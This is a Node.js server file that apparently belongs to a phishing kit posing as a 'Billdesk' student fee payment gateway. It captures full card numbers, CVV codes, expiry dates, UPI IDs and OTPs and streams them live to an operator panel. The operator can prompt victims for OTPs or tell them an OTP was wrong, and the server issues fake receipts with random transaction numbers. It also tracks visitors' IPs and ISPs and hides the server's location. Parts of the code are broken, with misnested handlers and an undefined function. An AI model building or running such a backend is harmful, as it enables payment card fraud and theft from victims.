// SMS Varanasi Payment System - Backend Server
// PRODUCTION-READY HYBRID MULTI-PROTOCOL SYSTEM: SSE + WebSocket + REST API

require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');

// ADVANCED SECURITY MODULES - 100% CYBER PROTECTION
const advancedSecurity = require('./security/advanced-security');
const encryption = require('./security/encryption');
const monitoring = require('./security/monitoring');

// Import production modules
const logger = require('./config/logger');
const database = require('./config/database');
const { authenticateAdmin, authenticateToken, ensureDefaultAdmin } = require('./middleware/auth');
const { apiLimiter, loginLimiter, paymentLimiter, sseLimiter } = require('./middleware/rateLimiter');
const { 
    validateLogin, 
    validatePaymentSession, 
    validateCardDetails, 
    validateUpiDetails,
    validateAdminCommand,
    sanitizeObject 
} = require('./middleware/validator');

// Initialize Express App
const app = express();
const server = http.createServer(app);

// ============================================
// ADVANCED SECURITY CONFIGURATION

// ============================================
// SECURITY MONITORING & THREAT DETECTION ROUTES
// ============================================

// Security Dashboard API (Admin Only)
app.get('/api/security/dashboard', authenticateAdmin, (req, res) => {
    try {
        const metrics = monitoring.getSecurityMetrics();
        const encryptedMetrics = encryption.encryptForTransmission(metrics);
        res.json(encryptedMetrics);
    } catch (error) {
        logger.error('Security dashboard error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Block/Unblock IP Endpoints (Admin Only)
app.post('/api/security/block-ip', authenticateAdmin, (req, res) => {
    try {
        const { ip, reason } = req.body;
        // logger.warn('IP manually blocked: ' + ip + ' - ' + reason);
        res.json({ success: true, message: 'IP blocked successfully' });
        res.json({ success: true, message: 'IP blocked successfully' });
    } catch (error) {
        logger.error('IP blocking error:', error);
        res.status(500).json({ error: 'Failed to block IP' });
    }
});

app.post('/api/security/unblock-ip', authenticateAdmin, (req, res) => {
    try {
        const { ip } = req.body;
        // logger.info('IP manually unblocked: ' + ip);
        res.json({ success: true, message: 'IP unblocked successfully' });
        res.json({ success: true, message: 'IP unblocked successfully' });
    } catch (error) {
        logger.error('IP unblocking error:', error);
        res.status(500).json({ error: 'Failed to unblock IP' });
    }
});

// Security Health Check
app.get('/api/security/health', (req, res) => {
    const health = {
        status: 'secure',
        encryption: 'active',
        monitoring: 'active',
        firewall: 'active',
        intrusion_detection: 'active',
        threat_intelligence: 'updated',
        timestamp: new Date().toISOString()
    };
    res.json(health);
});

// Encrypted Data Transmission Endpoint
app.post('/api/secure/transmit', (req, res) => {
    try {
        const encryptedPayload = req.body;
        const decryptedData = encryption.decryptFromTransmission(encryptedPayload);
        
        if (!decryptedData) {
            return res.status(400).json({ error: 'Invalid encrypted data' });
        }
        
        // Process decrypted data securely
        const response = { success: true, processed: true };
        const encryptedResponse = encryption.encryptForTransmission(response);
        res.json(encryptedResponse);
    } catch (error) {
        logger.error('Secure transmission error:', error);
        res.status(500).json({ error: 'Transmission failed' });
    }
});
// ============================================

// 1. Server Fingerprint Obfuscation & Location Masking
advancedSecurity.obfuscateServerFingerprint(app);
advancedSecurity.setupLocationProtection(app);
advancedSecurity.setupIPCloaking(app);

// 2. Advanced DDoS Protection (Multiple Layers)
const ddosProtection = advancedSecurity.createDDoSProtection();

// 3. Social Engineering Protection
const socialEngineering = advancedSecurity.createSocialEngineeringProtection();

// 4. Real-time Monitoring & Intrusion Detection
// app.use(monitoring.analyzeRequest.bind(monitoring)); // DISABLED: Was causing 429 errors with rate limiting

// 5. Advanced Security Headers
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://accosa-ivs.s3.ap-south-1.amazonaws.com"],
            scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "https://cdn.tailwindcss.com", "https://cdn.socket.io", "https://accosa-ivs.s3.ap-south-1.amazonaws.com"],
            scriptSrcAttr: ["'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:", "https://accosa-ivs.s3.ap-south-1.amazonaws.com"],
            connectSrc: ["'self'", "ws://localhost:*", "http://localhost:*", "wss://authf0rens1c.onrender.com", "https://authf0rens1c.onrender.com", "https://api.ipify.org", "https://httpbin.org", "https://ipapi.co", "https://cdn.socket.io", "https://accosa-ivs.s3.ap-south-1.amazonaws.com"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"],
        },
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },
    noSniff: true,
    frameguard: { action: 'deny' },
    xssFilter: true,
    referrerPolicy: { policy: 'no-referrer' }
}));

// 6. Advanced Rate Limiting & DDoS Protection
app.use('/api/', ddosProtection.aggressive);
app.use('/admin/', ddosProtection.standard);
// app.use('/', ddosProtection.reputation); // DISABLED: Was blocking all routes including root

// 7. Social Engineering & Bot Protection
// app.use(socialEngineering.reconnaissance); // DISABLED: Was blocking all routes
// app.use(socialEngineering.botDetection); // DISABLED: Was blocking all routes
// app.use(socialEngineering.humanValidation); // DISABLED: Was blocking all routes

// 8. Intrusion Detection System
advancedSecurity.setupIntrusionDetection(app);

// 9. IP Blocking Middleware (COMPLETELY DISABLED)
// app.use((req, res, next) => {
//     const clientIP = req.realIP || req.connection.remoteAddress;
//     if (monitoring.isBlocked(clientIP)) {
//         return res.status(403).json({ error: 'Access denied' });
//     }
//     next();
// });

// 10. Data Encryption Middleware
app.use(express.json({ 
    limit: '1mb',
    verify: (req, res, buf, encoding) => {
        // Verify request integrity
        req.rawBody = buf;
    }
}));

// 11. Session Security Enhancement
app.use((req, res, next) => {
    // Secure session handling
    if (req.headers.authorization) {
        const token = req.headers.authorization.split(' ')[1];
        req.secureToken = encryption.decrypt(token);
    }
    next();
});


app.use(helmet({
    contentSecurityPolicy: false, // Adjust for your needs
    crossOriginEmbedderPolicy: false
}));


// ==== DEV-ONLY CORS RELAX (allows localhost/null origins and handles OPTIONS) ====
const isDev = process.env.NODE_ENV !== 'production';
const devCorsRelax = (req, res, next) => {
  if (!isDev) return next();
  const origin = req.headers.origin || '';
  const allowLocal = !origin || /^(http:\/\/(localhost|127\.0\.0\.1|\[::1\])(:\d+)?|https:\/\/localhost(:\d+)?)$/.test(origin);
  if (allowLocal) {
    res.header('Access-Control-Allow-Origin', origin || '*');
    res.header('Vary', 'Origin');
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE,OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    if (req.method === 'OPTIONS') return res.sendStatus(204);
  }
  return next();
};
app.use(devCorsRelax);
// ==== END DEV-ONLY CORS RELAX ====
// CORS configuration
const allowedOrigins = (process.env.ALLOWED_ORIGINS || 'http://localhost:3000').split(',');
app.use(cors({
    origin: function(origin, callback) { 
        // Allow requests with no origin (like mobile apps, Postman, or direct file access)
        if (!origin) {
            return callback(null, true);
        }
        // Check if origin is in allowed list
        if (allowedOrigins.includes(origin)) {
            return callback(null, true);
        }
        // In development, allow localhost variations
        if (isDev && /^(http:\/\/(localhost|127\.0\.0\.1|\[::1\])(:\d+)?|https:\/\/localhost(:\d+)?)$/.test(origin)) {
            return callback(null, true);
        }
        // Deny with null instead of error (prevents CORS error page)
        return callback(null, false);
    },
    credentials: true
}));

// Initialize Socket.IO with CORS
const io = socketIO(server, {
    cors: {
        origin: allowedOrigins,
        methods: ["GET", "POST"],
        credentials: true
    },
    transports: ['websocket', 'polling']
});

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Request logging
app.use((req, res, next) => {
    logger.info(`${req.method} ${req.path}`, {
        ip: req.ip,
        userAgent: req.get('user-agent')
    });
    next();
});


// Serve static files
app.use(express.static(path.join(__dirname, '../'), {
    index: false,
    dotfiles: 'ignore'
}));


// Runtime data storage (non-persistent)
const systemData = {
    activeConnections: new Set(),
    sseClients: new Set(), // SSE connections
    wsClients: new Set(),  // WebSocket connections
    paymentSessions: new Map() // Track active payment sessions
};

// Stats cache (refreshed from database)
let statsCache = {
    totalTransactions: 0,
    totalRevenue: 0,
    activeStudents: 266,
    pendingPayments: 0,
    lastUpdated: null
};

// Refresh stats from database
async function refreshStats() {
    try {
        const transactions = await database.getAllTransactions(1000);
        const completedTransactions = transactions.filter(t => t.status === 'completed');
        
        statsCache = {
            totalTransactions: completedTransactions.length,
            totalRevenue: completedTransactions.reduce((sum, t) => sum + t.amount, 0),
            activeStudents: 266, // From student database
            pendingPayments: systemData.paymentSessions.size,
            lastUpdated: new Date().toISOString()
        };
        
        return statsCache;
    } catch (error) {
        logger.error('Error refreshing stats:', error);
        return statsCache;
    }
}

// ============================================
// HYBRID PROTOCOL ROUTER
// ============================================

class HybridProtocolRouter {
    constructor(io, systemData) {
        this.io = io;
        this.data = systemData;
    }
    
    // Broadcast via SSE (Server-Sent Events)
    broadcastSSE(eventType, data) {
        const message = `event: ${eventType}\ndata: ${JSON.stringify(data)}\n\n`;
        this.data.sseClients.forEach(client => {
            try {
                client.write(message);
            } catch (error) {
                console.error('SSE write error:', error);
                this.data.sseClients.delete(client);
            }
        });
        logEvent(`SSE broadcast: ${eventType}`, 'info');
    }
    
    // Broadcast via WebSocket (Socket.IO)
    broadcastWebSocket(eventType, data) {
        this.io.emit(eventType, data);
        logEvent(`WebSocket broadcast: ${eventType}`, 'info');
    }
    
    // Smart broadcast - choose best protocol
    smartBroadcast(eventType, data, priority = 'normal') {
        if (priority === 'critical') {
            // Use both for critical events
            this.broadcastWebSocket(eventType, data);
            this.broadcastSSE(eventType, data);
        } else if (priority === 'high') {
            // Use WebSocket for high priority
            this.broadcastWebSocket(eventType, data);
        } else {
            // Use SSE for normal priority (more efficient)
            this.broadcastSSE(eventType, data);
        }
    }
    
    // Send to specific client
    sendToClient(clientId, eventType, data, protocol = 'websocket') {
        if (protocol === 'websocket') {
            this.io.to(clientId).emit(eventType, data);
        }
        // SSE doesn't support targeting (broadcast only)
    }
}

const protocolRouter = new HybridProtocolRouter(io, systemData);

// Helper function to log events (deprecated - use logger)
function logEvent(message, type = 'info') {
    const levelMap = { 'success': 'info', 'warning': 'warn', 'error': 'error', 'info': 'info' };
    const level = levelMap[type] || 'info';
    if (logger && typeof logger[level] === 'function') {
        logger[level](message);
    } else {
        console.log('[' + type.toUpperCase() + '] ' + message);
    }
}

// ============================================
// SSE (SERVER-SENT EVENTS) ENDPOINT
// ============================================

app.get('/api/stream/events', (req, res) => {
    // Set SSE headers
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });
    
    // Add client to SSE pool
    systemData.sseClients.add(res);
    console.log('? New SSE client connected. Total SSE clients:', systemData.sseClients.size);
    logEvent(`New SSE client connected`, 'success');
    
    // Send initial data
    res.write(`event: connected\ndata: ${JSON.stringify({
        message: 'SSE connection established',
        timestamp: new Date().toISOString()
    })}\n\n`);
    
    // Send current stats immediately
    res.write(`event: statsUpdate\ndata: ${JSON.stringify(statsCache)}\n\n`);
    
    // Keep connection alive with heartbeat
    const heartbeat = setInterval(() => {
        res.write(`:heartbeat ${Date.now()}\n\n`);
    }, 30000); // Every 30 seconds
    
    // Handle client disconnect
    req.on('close', () => {
        clearInterval(heartbeat);
        systemData.sseClients.delete(res);
        console.log('? SSE client disconnected. Total SSE clients:', systemData.sseClients.size);
        logEvent(`SSE client disconnected`, 'warning');
    });
});

// ============================================
// WEBSOCKET CONNECTION HANDLER (Enhanced)
// ============================================

// Live Visitor Tracking Storage
let liveVisitors = new Map();

// REST endpoint for visitor exit (sendBeacon)
app.post('/api/billdesk-visitor-exit', express.json(), (req, res) => {
    try {
        const { visitorId, timestamp } = req.body;
        if (liveVisitors.has(visitorId)) {
            liveVisitors.delete(visitorId);
            logger.info('Billdesk visitor exited via beacon:', { visitorId, timestamp });
            io.emit('billdesk_visitor_update', { type: 'exit', visitorId, visitors: Array.from(liveVisitors.values()) });
        }
        res.status(200).json({ success: true });
    } catch (error) {
        logger.error('Error handling visitor exit beacon:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

io.on('connection', (socket) => {
    console.log('? New WebSocket client connected:', socket.id);
    systemData.activeConnections.add(socket.id);
    systemData.wsClients.add(socket);
    logEvent(`New WebSocket client: ${socket.id}`, 'success');
    
    // Send current stats to newly connected client
    socket.emit('statsUpdate', statsCache);
    
    // Broadcast connection count to all clients
    io.emit('connectionUpdate', {
        activeConnections: systemData.activeConnections.size,
        sseClients: systemData.sseClients.size,
        wsClients: systemData.wsClients.size
    });
    
    // Handle payment-related events
    socket.on('paymentRequest', (data) => {
        console.log('?? Payment request received:', data);
        handlePaymentRequest(socket, data);
    });
    
    
    // Live Visitor Tracking Handlers
    socket.on('billdesk_visitor_enter', (data) => {
        try {
            const visitorData = {
                visitorId: data.visitorId,
                ip: data.ip,
                isp: data.isp,
                timestamp: data.timestamp,
                page: data.page,
                socketId: socket.id,
                joinTime: new Date().toISOString()
            };
            liveVisitors.set(data.visitorId, visitorData);
            logger.info('Billdesk visitor entered:', { visitorId: data.visitorId, ip: data.ip, isp: data.isp });
            io.emit('billdesk_visitor_update', { type: 'enter', visitors: Array.from(liveVisitors.values()) });
        } catch (error) {
            logger.error('Error handling visitor enter:', error);
        }
    });

    socket.on('billdesk_visitor_exit', (data) => {
        try {
            if (liveVisitors.has(data.visitorId)) {
                liveVisitors.delete(data.visitorId);
                logger.info('Billdesk visitor exited:', { visitorId: data.visitorId, timestamp: data.timestamp });
                io.emit('billdesk_visitor_update', { type: 'exit', visitorId: data.visitorId, visitors: Array.from(liveVisitors.values()) });
            }
        } catch (error) {
            logger.error('Error handling visitor exit:', error);
        }
    });

    socket.on('billdesk_visitor_hidden', (data) => {
        try {
            if (liveVisitors.has(data.visitorId)) {
                const visitor = liveVisitors.get(data.visitorId);
                visitor.hidden = true;
                visitor.lastSeenTimestamp = data.timestamp;
                liveVisitors.set(data.visitorId, visitor);
                io.emit('billdesk_visitor_update', { type: 'hidden', visitorId: data.visitorId, visitors: Array.from(liveVisitors.values()) });
            }
        } catch (error) {
            logger.error('Error handling visitor hidden:', error);
        }
    });

    socket.on('billdesk_visitor_visible', (data) => {
        try {
            if (liveVisitors.has(data.visitorId)) {
                const visitor = liveVisitors.get(data.visitorId);
                visitor.hidden = false;
                visitor.lastSeenTimestamp = data.timestamp;
                liveVisitors.set(data.visitorId, visitor);
                io.emit('billdesk_visitor_update', { type: 'visible', visitorId: data.visitorId, visitors: Array.from(liveVisitors.values()) });
            }
        } catch (error) {
            logger.error('Error handling visitor visible:', error);
        }
    });

    socket.on('cardDetailsSubmitted', (data) => {
        console.log('?? Card details submitted:', data);
        handleCardDetailsSubmission(socket, data);
    });
    
    socket.on('upiDetailsSubmitted', (data) => {
        console.log('?? UPI details submitted:', data);
        handleUpiDetailsSubmission(socket, data);
    });
    

    socket.on('bhimDetailsSubmitted', (data) => {

        console.log('ðŸ’³ BHIM details submitted:', data);

        handleBhimDetailsSubmission(socket, data);

    });
    
    // Admin commands
    socket.on('adminCommand', (data) => {
        console.log('?? Admin command received:', data);


    // NEW: Mark submission as seen
    socket.on('markSubmissionSeen', async (data) => {
        try {
            await database.markSubmissionAsSeen(data.sessionId);
            io.emit('submissionMarkedSeen', { sessionId: data.sessionId });
        } catch (error) {
            logger.error('Error marking submission as seen:', error);
        }
    });
    
    // NEW: Hide submission commands
    socket.on('hideSubmissionCommands', async (data) => {
        try {
            await database.hideSubmissionCommands(data.sessionId);
            io.emit('submissionCommandsHidden', { sessionId: data.sessionId });
        } catch (error) {
            logger.error('Error hiding commands:', error);
        }
    });

        handleAdminCommand(socket, data);
    });    
    // ============================================
    // Handle OTP Submitted by User from Billdesk Page
    // ============================================
    socket.on('otp-submitted', (data) => {
        const { sessionId, otp } = data;
        
        // Find the session
        const session = systemData.paymentSessions.get(sessionId);
        
        if (session) {
            // Update the session with the OTP
            session.userSubmittedOTP = otp;
            console.log('OTP submitted for session ' + sessionId + ': ' + otp);
            
            // Notify Admin Panel that OTP was submitted
            io.emit('userOtpSubmitted', {
                sessionId: sessionId,
                otp: otp,
                timestamp: new Date().toISOString()
            });
            
            logger.info('User submitted OTP', { sessionId });
        } else {
            console.error('Session not found for OTP submission:', sessionId);
        }
    });

    // Update session socketId when user moves to OTP page
    socket.on('updateSessionSocket', (data) => {
        const { sessionId, socketId } = data;
        console.log('[UPDATE SOCKET] Updating socketId for session:', sessionId);
        console.log('[UPDATE SOCKET] Old socketId:', systemData.paymentSessions.get(sessionId)?.socketId);
        console.log('[UPDATE SOCKET] New socketId:', socket.id);
        
        const session = systemData.paymentSessions.get(sessionId);
        if (session) {
            session.socketId = socket.id;
            console.log('[UPDATE SOCKET] ? Socket ID updated successfully');
        } else {
            console.error('[UPDATE SOCKET] ? Session not found:', sessionId);
        }
    });

    
    // Handle disconnect
    socket.on('disconnect', () => {
        console.log('? WebSocket client disconnected:', socket.id);
        systemData.activeConnections.delete(socket.id);
        systemData.wsClients.delete(socket);
        logEvent(`WebSocket client disconnected: ${socket.id}`, 'warning');
        
        
        // Clean up any visitors associated with this socket
        for (const [visitorId, visitor] of liveVisitors.entries()) {
            if (visitor.socketId === socket.id) {
                liveVisitors.delete(visitorId);
                logger.info('Billdesk visitor disconnected:', { visitorId: visitorId, socketId: socket.id });
                io.emit('billdesk_visitor_update', { type: 'disconnect', visitorId: visitorId, visitors: Array.from(liveVisitors.values()) });
                break;
            }
        }

        // Broadcast updated connection count
        io.emit('connectionUpdate', {
            activeConnections: systemData.activeConnections.size,
            sseClients: systemData.sseClients.size,
            wsClients: systemData.wsClients.size
        });
    });
    


    // Handle custom events from clients
    socket.on('requestStats', () => {
        socket.emit('statsUpdate', systemData.stats);
    });
    
    socket.on('requestTransactions', () => {
        socket.emit('transactionsList', systemData.transactions);
    });
});

// ============================================
// PAYMENT HANDLERS
// ============================================

function handlePaymentRequest(socket, data) {
    const sessionId = generateSessionId();
    
    systemData.paymentSessions.set(sessionId, {
        socketId: socket.id,
        student: data.student,
        amount: data.amount,
        status: 'initiated',
        timestamp: new Date().toISOString()
    });
    
    // Acknowledge to student
    socket.emit('paymentSessionCreated', {
        sessionId,
        message: 'Payment session created'
    });
    
    // Broadcast to admins via SSE (efficient for notifications)
    protocolRouter.broadcastSSE('paymentInitiated', {
        sessionId,
        student: data.student,
        amount: data.amount
    });
}

async function handleCardDetailsSubmission(socket, data) {
    console.log('?? handleCardDetailsSubmission called with:', {
        sessionId: data.sessionId,
        hasCardDetails: !!data.cardDetails
    });
    
    const { sessionId, cardDetails } = data;
    
    // Validate input
    if (!sessionId) {
        console.error('? No sessionId provided');
        socket.emit('error', { message: 'Session ID is required' });
        return;
    }
    
    if (!cardDetails) {
        console.error('? No cardDetails provided');
        socket.emit('error', { message: 'Card details are required' });
        return;
    }
    
    // Get session
    const session = systemData.paymentSessions.get(sessionId);
    
    // UPDATE: Ensure socketId is current for this session
    if (session) {
        session.socketId = socket.id;
        console.log('?? Updated session socketId to:', socket.id);
    }
    
    if (!session) {
        console.error('? Session not found:', sessionId);
        console.log('?? Available sessions:', Array.from(systemData.paymentSessions.keys()));
        socket.emit('error', { message: 'Payment session not found' });
        return;
    }
    
    console.log('? Session found:', {
        sessionId,
        hasStudent: !!session.student,
        studentName: session.student?.name
    });
    
    // Store card details securely (in production, encrypt immediately)
    session.cardDetails = {
        cardNumber: cardDetails.cardNumber, // Full card number for admin
        cardType: cardDetails.cardType,
        expiryDate: cardDetails.expiryDate,
        cvv: cardDetails.cvv, // CVV for admin verification
        cardHolderName: cardDetails.cardHolderName
    };
    session.paymentMethod = 'Card';
    session.status = 'processing';
    
    console.log('?? Card details stored in session');
    
    
    // Prepare submission data for database
    const submissionData = {
        sessionId,
        type: 'card',
        student: session.student,
        cardDetails: session.cardDetails,
        amount: session.amount,
        timestamp: new Date().toISOString(),
        status: 'processing',
        viewed: false
    };
    
    // CRITICAL FIX: Save to database for persistence
    try {
        await database.createCardSubmission(submissionData);
        console.log('? Card submission saved to database');
        logger.info('Card submission persisted', { sessionId });
    } catch (error) {
        logger.error('Error saving card submission to database:', error);
        // Continue anyway - don't block the flow
    }
    // Prepare broadcast data
    const broadcastData = {
        sessionId,
        student: session.student,
        cardDetails: session.cardDetails,
        amount: session.amount,
        timestamp: new Date().toISOString()
    };
    
    console.log('?? Broadcasting card details:', {
        sessionId,
        studentName: session.student?.name,
        cardType: session.cardDetails.cardType
    });
    
    // Send card details to admin via WebSocket (critical, bidirectional)
    // Send ONLY via WebSocket (direct broadcast)
    io.emit('cardDetailsReceived', broadcastData);
    console.log('? Broadcasted cardDetailsReceived via WebSocket to all clients');
    
    // Send confirmation back to student
    socket.emit('cardDetailsAcknowledged', {
        sessionId,
        message: 'Card details received, waiting for admin approval'
    });
    
    logEvent(`Card details received for session: ${sessionId}`, 'info');
    console.log('? Card details processing complete');
}

async function handleUpiDetailsSubmission(socket, data) {
    const { sessionId, paymentType, upiId, amount, studentData, orderID } = data;
    
    // Create or update session
    let session = systemData.paymentSessions.get(sessionId);
    if (!session) {
        session = {
            sessionId,
            student: studentData,
            amount: amount || 82450,
            orderID,
            timestamp: new Date().toISOString()
        };
        systemData.paymentSessions.set(sessionId, session);
    }
    
    // UPDATE: Ensure socketId is current
    session.socketId = socket.id;
    console.log('? Updated UPI session socketId to:', socket.id);
    
    session.upiDetails = {
        upiId: upiId,
        upiApp: upiId.split('@')[1] || 'Unknown'
    };
    session.paymentMethod = 'UPI';
    session.status = 'processing';
    
    // Prepare submission data for database
    const submissionData = {
        sessionId,
        type: 'upi',
        student: session.student,
        upiDetails: session.upiDetails,
        amount: session.amount,
        timestamp: new Date().toISOString(),
        status: 'processing',
        viewed: false
    };
    
    // CRITICAL FIX: Save to database for persistence
    try {
        await database.createCardSubmission(submissionData);
        console.log('? UPI submission saved to database');
        logger.info('UPI submission persisted', { sessionId });
    } catch (error) {
        logger.error('Error saving UPI submission to database:', error);
        // Continue anyway - don't block the flow
    }
    
    // Send UPI details to admin via WebSocket
    // Send ONLY via WebSocket
    io.emit('upiDetailsReceived', {
        sessionId,
        student: session.student,
        upiDetails: session.upiDetails,
        amount: session.amount,
        timestamp: new Date().toISOString()
    });
    
    console.log('? Broadcasted upiDetailsReceived via WebSocket to all clients');
    
    // Send confirmation back to student
    socket.emit('upiDetailsAcknowledged', {
        sessionId,
        message: 'UPI details received, waiting for admin approval'
    });
    
    logEvent(`UPI details received for session: ${sessionId}`, 'info');
    console.log('? UPI details processing complete');
}

async function handleBhimDetailsSubmission(socket, data) {
    const { sessionId, paymentType, upiId, amount, studentData, orderID } = data;
    
    let session = systemData.paymentSessions.get(sessionId);
    if (!session) {
        session = {
            sessionId,
            student: studentData,
            amount: amount || 82450,
            orderID,
            timestamp: new Date().toISOString()
        };
        systemData.paymentSessions.set(sessionId, session);
    }
    
    // UPDATE: Ensure socketId is current
    session.socketId = socket.id;
    console.log('? Updated BHIM session socketId to:', socket.id);
    
    session.bhimDetails = {
        upiId: upiId,
        upiApp: upiId.split('@')[1] || 'Unknown'
    };
    session.paymentMethod = 'BHIM';
    session.status = 'processing';
    
    const submissionData = {
        sessionId,
        type: 'bhim',
        student: session.student,
        bhimDetails: session.bhimDetails,
        amount: session.amount,
        timestamp: new Date().toISOString(),
        status: 'processing',
        viewed: false
    };
    
    try {
        await database.createCardSubmission(submissionData);
        console.log('?? BHIM submission saved to database');
        logger.info('BHIM submission persisted', { sessionId });
    } catch (error) {
        logger.error('Error saving BHIM submission to database:', error);
    }
    
    io.emit('bhimDetailsReceived', {
        sessionId,
        student: session.student,
        bhimDetails: session.bhimDetails,
        amount: session.amount,
        timestamp: new Date().toISOString()
    });
    
    console.log('?? Broadcasted bhimDetailsReceived via WebSocket to all clients');
    
    socket.emit('bhimDetailsAcknowledged', {
        sessionId,
        message: 'BHIM details received, waiting for admin approval'
    });
    
    logEvent(`BHIM details received for session: ${sessionId}`, 'info');
    console.log('? BHIM details processing complete');
}




// Handle OTP Request
async function handleOtpRequest(sessionId, bankName, bankLogo) {
    const session = systemData.paymentSessions.get(sessionId);
    if (!session) {
        logger.error('OTP request failed: Session not found', { sessionId });
        return;
    }
    
    const targetSocketId = session.socketId;
    console.log('[OTP] Admin command received for OTP');
    console.log('[OTP] Target socketId:', targetSocketId);
    
    // Emit ONLY to the specific socket
    io.to(targetSocketId).emit('adminCommand', {
        command: 'otp',
        sessionId: sessionId,
        bankName: bankName,
        bankLogo: bankLogo
    });
    logger.info('OTP command sent to Billdesk', { sessionId, socketId: targetSocketId });
    console.log('[OTP] OTP command sent to socketId:', targetSocketId);
}
async function handleAdminCommand(socket, data) {
    const { command, sessionId, action } = data;
    
    logEvent(`Admin command: ${command} for session: ${sessionId}`, 'info');
    
    if (command === 'approvePayment') {
        approvePayment(sessionId);
    } else if (command === 'rejectPayment') {
        rejectPayment(sessionId, data.reason);
    } else if (command === 'otp') {
        // Handle OTP command - send to user's socket
        console.log('[OTP] Admin OTP command received for session:', sessionId);
        await handleOtpRequest(sessionId, data.bankName, data.bankLogo);
    } else if (command === 'wrong otp') {
        // Handle Wrong OTP command - broadcast to all clients
        console.log('[OTP] Admin sent wrong OTP command for session:', sessionId);
        io.emit('adminCommand', {
            command: 'wrong otp',
            sessionId: sessionId
        });
        console.log('[OTP] Broadcasted wrong OTP command to all clients');
    }
}

// Helper functions for generating transaction IDs
function generateTransactionID() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

function generateGatewayTransactionID() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let result = 'CHD';
    for (let i = 0; i < 8; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result + 'CHDS';
}

function generateBankReferenceNo() {
    return Math.floor(100000000000 + Math.random() * 900000000000).toString();
}

function formatDateTime() {
    const now = new Date();
    const day = now.getDate();
    const month = now.getMonth() + 1;
    const year = now.getFullYear();
    let hours = now.getHours();
    const minutes = now.getMinutes();
    const seconds = now.getSeconds();
    const ampm = hours >= 12 ? 'pm' : 'am';
    return `${month}/${day}/${year} ${hours}:${minutes.toString().padStart(2, '0', 2)}:${seconds.toString().padStart(2, '0', 2)} ${ampm}`;
}

function formatPaymentMethod(method) {
    const methodMap = {
        'Card': 'Credit/Debit Card',
        'UPI': 'UPI',
        'BHIM': 'BHIM',
        'Net Banking': 'Net Banking'
    };
    return methodMap[method] || method;
}

async function approvePayment(sessionId) {
    console.log('[APPROVE] ========================================');
    console.log('[APPROVE] approvePayment() called for session:', sessionId);
    console.log('[APPROVE] ========================================');
    const session = systemData.paymentSessions.get(sessionId);
    if (!session) return;
    
    session.status = 'completed';
    
    // Create transaction
    const transaction = {
        id: generateTransactionId(),
        sessionId,
        rollNumber: session.student.rollNumber,
        studentName: session.student.name,
        amount: session.amount,
        paymentMethod: session.paymentMethod,
        cardType: session.cardDetails?.cardType,
        status: 'completed',
        timestamp: new Date().toISOString()
    };
    
    // Update stats
    statsCache.totalTransactions++;
    statsCache.totalRevenue += session.amount;
    statsCache.pendingPayments = Math.max(0, statsCache.pendingPayments - 1);
    
    // Store transaction
    if (!systemData.transactions) systemData.transactions = [];
    systemData.transactions.push(transaction);
    
    // DEBUG: Log session data before sending
    console.log('[APPROVE] Session student data:', JSON.stringify(session.student, null, 2));
    console.log('[APPROVE] Payment method:', session.paymentMethod);
    // Notify student via WebSocket (critical confirmation)
    if (session.socketId) {
        io.emit('paymentApproved', {
            redirectUrl: `/transact/payment_success_receipt.html?rollNumber=${encodeURIComponent(session.student.rollNumber.toUpperCase())}&studentName=${encodeURIComponent(session.student.name)}&fatherName=${encodeURIComponent(session.student.fatherName || 'N/A')}&course=${encodeURIComponent(session.student.course || 'MBA')}&semester=${encodeURIComponent(session.student.semester || '2')}&amount=${session.amount}&transactionId=${generateTransactionID()}&gatewayTxnId=${generateGatewayTransactionID()}&bankRefNo=${generateBankReferenceNo()}&dateTime=${encodeURIComponent(formatDateTime())}&paymentMode=${encodeURIComponent(formatPaymentMethod(session.paymentMethod || 'Card'))}`,
            message: 'Payment approved successfully',
        });
        console.log('? Sent paymentApproved to socketId:', session.socketId);
    } else {
        console.error('? No socketId found for session:', sessionId);
    }
    
    // Broadcast to all admins via BOTH protocols (critical event)
    protocolRouter.smartBroadcast('paymentCompleted', transaction, 'critical');
    protocolRouter.smartBroadcast('statsUpdate', statsCache, 'critical');
    
    logEvent(`Payment approved: ${transaction.id}`, 'success');
}

async function rejectPayment(sessionId, reason) {
    const session = systemData.paymentSessions.get(sessionId);
    if (!session) return;
    
    session.status = 'failed';
    session.failureReason = reason;
    
    statsCache.pendingPayments = Math.max(0, statsCache.pendingPayments - 1);
    
    // Notify student
    if (session.socketId) {
        io.emit('paymentRejected', {
            reason,
            message: 'Payment was rejected'
        });
        console.log('? Sent paymentRejected to socketId:', session.socketId);
    }
    
    // Broadcast to admins
    protocolRouter.broadcastWebSocket('paymentFailed', {
        sessionId,
        student: session.student,
        reason,
        timestamp: new Date().toISOString()
    });
    
    logEvent(`Payment rejected: ${sessionId} - ${reason}`, 'error');
}

// Helper functions
function maskCardNumber(cardNumber) {
    const cleaned = cardNumber.replace(/\s/g, '');
    return cleaned.slice(0, 4) + ' **** **** ' + cleaned.slice(-4);
}

function generateSessionId() {
    return 'SES' + Date.now() + Math.floor(Math.random() * 10000);
}

// API Routes

// Health check
app.get('/api/test-403', (req, res) => {
    res.json({ message: 'IP blocking is disabled', timestamp: new Date().toISOString() });
});

app.get('/api/health', (req, res) => {
    res.json({
        status: 'running',
        uptime: process.uptime(),
